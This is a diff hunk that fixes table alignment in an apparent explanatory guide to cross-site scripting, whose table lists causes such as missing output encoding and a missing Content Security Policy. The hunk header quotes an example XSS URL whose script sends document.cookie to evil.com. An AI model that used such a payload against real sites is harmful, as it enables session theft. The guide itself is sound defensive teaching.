@@ -94,20 +94,20 @@ https://site.com/hello?name=<script>fetch('https://evil.com?c='+document.cookie)
 │  CAUSE                     │  EXPLANATION                            │
 ├────────────────────────────┼─────────────────────────────────────────┤
 │ 🚫 No Input Validation     │ User-supplied data is accepted as-is,   │
-│                            │ without filtering or rejecting           │
-│                            │ dangerous characters                     │
+│                            │ without filtering or rejecting          │
+│                            │ dangerous characters                    │
 ├────────────────────────────┼─────────────────────────────────────────┤
-│ 🚫 No Output Encoding      │ Data is rendered directly as HTML        │
-│                            │ instead of being HTML-encoded first      │
+│ 🚫 No Output Encoding      │ Data is rendered directly as HTML       │
+│                            │ instead of being HTML-encoded first     │
 ├────────────────────────────┼─────────────────────────────────────────┤
-│ 🚫 Missing CSP             │ No Content Security Policy header is     │
-│                            │ set to restrict script execution         │
+│ 🚫 Missing CSP             │ No Content Security Policy header is    │
+│                            │ set to restrict script execution        │
 ├────────────────────────────┼─────────────────────────────────────────┤
-│ 🚫 Unsafe DOM Handling     │ JavaScript uses innerHTML, eval(),       │
-│                            │ document.write() with untrusted data     │
+│ 🚫 Unsafe DOM Handling     │ JavaScript uses innerHTML, eval(),      │
+│                            │ document.write() with untrusted data    │
 ├────────────────────────────┼─────────────────────────────────────────┤
-│ 🚫 Framework Misuse        │ Security features of the framework are   │
-│                            │ disabled or bypassed (e.g. auto-escape)  │
+│ 🚫 Framework Misuse        │ Security features of the framework are  │
+│                            │ disabled or bypassed (e.g. auto-escape) │
 └────────────────────────────┴─────────────────────────────────────────┘
 ```
 
